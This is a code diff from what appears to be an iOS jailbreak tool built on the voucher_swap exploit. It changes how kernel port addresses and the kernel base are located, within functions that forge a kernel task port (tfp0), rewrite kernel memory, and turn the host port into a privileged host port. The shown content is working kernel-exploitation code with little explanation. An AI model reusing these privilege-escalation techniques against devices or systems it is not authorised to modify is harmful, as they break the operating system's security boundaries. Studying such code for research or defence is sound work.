@@ -51,6 +51,7 @@
 #include "voucher_swap.h"
 #include "kernel_memory.h"
 #include "kernel_slide.h"
+#include "find_port.h"
 
 @interface NSUserDefaults ()
 - (id)objectForKey:(id)arg1 inDomain:(id)arg2;
@@ -199,7 +200,7 @@ uint32_t IKOT_NONE = 0;
 
 void convert_port_to_task_port(mach_port_t port, uint64_t space, uint64_t task_kaddr) {
     // now make the changes to the port object to make it a task port:
-    uint64_t port_kaddr = get_address_of_port(getpid(), port);
+    uint64_t port_kaddr = find_port_address(port, MACH_MSG_TYPE_MAKE_SEND);
     
     WriteKernel32(port_kaddr + koffset(KSTRUCT_OFFSET_IPC_PORT_IO_BITS), IO_BITS_ACTIVE | IKOT_TASK);
     WriteKernel32(port_kaddr + koffset(KSTRUCT_OFFSET_IPC_PORT_IO_REFERENCES), 0xf00d);
@@ -339,12 +340,12 @@ void remap_tfp0_set_hsp4(mach_port_t *port) {
     _assert(kernel_task_kaddr != remapped_task_addr, message, true);
     LOG("remapped_task_addr = "ADDR"", remapped_task_addr);
     _assert(mach_vm_wire(mach_host_self(), km_fake_task_port, remapped_task_addr, sizeof_task, VM_PROT_READ | VM_PROT_WRITE) == KERN_SUCCESS, message, true);
-    uint64_t port_kaddr = get_address_of_port(getpid(), *port);
+    uint64_t port_kaddr = find_port_address(*port, MACH_PORT_TYPE_SEND);
     LOG("port_kaddr = "ADDR"", port_kaddr);
     make_port_fake_task_port(*port, remapped_task_addr);
     _assert(ReadKernel64(port_kaddr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT)) == remapped_task_addr, message, true);
     // lck_mtx -- arm: 8  arm64: 16
-    uint64_t host_priv_kaddr = get_address_of_port(getpid(), mach_host_self());
+    uint64_t host_priv_kaddr = find_port_address(mach_host_self(), MACH_PORT_TYPE_SEND);
     uint64_t realhost_kaddr = ReadKernel64(host_priv_kaddr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT));
     WriteKernel64(realhost_kaddr + koffset(KSTRUCT_OFFSET_HOST_SPECIAL) + 4 * sizeof(void*), port_kaddr);
     set_all_image_info_addr(kernel_task_kaddr, kernel_base);
@@ -565,7 +566,7 @@ out:
 #define IKOT_HOST_PRIV 4
 
 void make_host_into_host_priv() {
-    uint64_t hostport_addr = get_address_of_port(getpid(), mach_host_self());
+    uint64_t hostport_addr = find_port_address(mach_host_self(), MACH_MSG_TYPE_COPY_SEND);
     uint32_t old = ReadKernel32(hostport_addr);
     LOG("old host type: 0x%08x", old);
     if ((old & (IO_ACTIVE | IKOT_HOST_PRIV)) != (IO_ACTIVE | IKOT_HOST_PRIV))
@@ -573,7 +574,7 @@ void make_host_into_host_priv() {
 }
 
 void make_host_priv_into_host() {
-    uint64_t hostport_addr = get_address_of_port(getpid(), mach_host_self());
+    uint64_t hostport_addr = find_port_address(mach_host_self(), MACH_MSG_TYPE_COPY_SEND);
     uint32_t old = ReadKernel32(hostport_addr);
     LOG("old host type: 0x%08x", old);
     if ((old & (IO_ACTIVE | IKOT_HOST)) != (IO_ACTIVE | IKOT_HOST))
@@ -848,10 +849,9 @@ void jailbreak()
                     offsets_init();
                     prepare_for_rw_with_fake_tfp0(kernel_task_port);
                     if (MACH_PORT_VALID(tfp0) &&
-                        kernel_slide_init() &&
-                        ISADDR(kernel_slide) &&
-                        ISADDR((kernel_base = (kernel_slide + KERNEL_SEARCH_ADDRESS))) &&
-                        ReadKernel32(kernel_base) == MACH_HEADER_MAGIC) {
+                        ISADDR((kernel_base = find_kernel_base())) &&
+                        ReadKernel32(kernel_base) == MACH_HEADER_MAGIC &&
+                        ISADDR((kernel_slide = (kernel_base - KERNEL_SEARCH_ADDRESS)))) {
                         exploit_success = true;
                     }
                     break;
